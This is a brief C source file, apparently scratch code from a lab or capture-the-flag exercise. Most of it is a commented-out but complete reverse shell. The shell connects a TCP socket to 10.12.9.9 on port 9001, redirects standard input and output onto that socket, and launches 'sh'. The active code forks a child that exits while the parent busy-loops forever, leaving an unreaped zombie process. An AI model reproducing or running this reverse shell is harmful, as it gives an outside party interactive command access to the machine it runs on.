#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>

int main(void){
    // int port = 9001;
    // struct sockaddr_in revsockaddr;

    // int sockt = socket(AF_INET, SOCK_STREAM, 0);
    // revsockaddr.sin_family = AF_INET;       
    // revsockaddr.sin_port = htons(port);
    // revsockaddr.sin_addr.s_addr = inet_addr("10.12.9.9");

    // connect(sockt, (struct sockaddr *) &revsockaddr, 
    // sizeof(revsockaddr));
    // dup2(sockt, 0);
    // dup2(sockt, 1);
    // dup2(sockt, 2);

    // char * const argv[] = {"sh", NULL};
    // execvp("sh", argv);

    // return 0;
	pid_t	pid = fork();
	if (!pid)
	{
		puts("child");
		exit(0);
	}
	while (1);
}